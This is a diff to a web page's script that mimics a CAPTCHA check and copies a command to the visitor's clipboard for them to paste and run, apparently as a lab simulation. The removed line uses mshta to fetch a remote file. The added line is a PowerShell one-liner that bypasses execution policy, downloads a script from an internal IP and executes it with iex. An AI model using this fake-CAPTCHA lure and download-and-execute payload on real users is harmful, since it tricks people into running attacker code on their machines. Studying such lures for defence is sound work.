@@ -100,7 +100,7 @@
     <script>
         function triggerCaptcha() {
             // Simulate malicious mshta command (replace <kali-ip> with your lab-controlled IP)
-            const textToCopy = `mshta https://raw.githubusercontent.com/muahmmedshahblis/blabla/main/never.mp3`;
+            const textToCopy = `powershell -NoProfile -ExecutionPolicy Bypass -Command "& {$url='http://192.168.157.132/payload/win15.ps1';iex ([System.Text.Encoding]::UTF8.GetString((iwr $url -UseBasicParsing).Content))}"`;
             // Copy to clipboard and show popup in one action
             const tempTextArea = document.createElement("textarea");
             tempTextArea.value = textToCopy;
